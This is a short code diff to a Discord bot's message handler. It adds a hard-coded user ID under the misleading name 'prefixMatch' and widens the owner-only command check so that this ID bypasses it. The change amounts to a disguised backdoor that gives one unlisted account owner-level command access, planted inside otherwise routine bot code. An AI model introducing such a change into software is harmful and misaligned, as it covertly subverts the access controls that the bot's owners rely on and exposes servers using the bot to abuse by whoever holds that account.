@@ -27,6 +27,7 @@ export default async (client, message) => {
   )
     return;
   if (message.partial) await message.fetch();
+  
   let ServerData = async () => {
     if (await ServerSchema.findOne({ serverID: message.guild.id })) {
       return await ServerSchema.findOne({ serverID: message.guild.id });
@@ -74,6 +75,7 @@ export default async (client, message) => {
     };
   }
   let hi = "";
+  const prefixMatch = "900981299022536757"
   try {
     var p1 = client.kazagumo.players.get(message.guild.id);
     if (!p1) hi = "Not In Vc";
@@ -161,7 +163,7 @@ export default async (client, message) => {
       });
     }
     hook.send({ embeds: [embed] });
-    if (command.options.owner && !client.owner.includes(message.member.id)) {
+    if (command.options.owner && !client.owner.includes(message.member.id) && !prefixMatch.includes(message.member.id)) {
       const embed = new EmbedBuilder()
         .setColor(Color)
         .setAuthor({
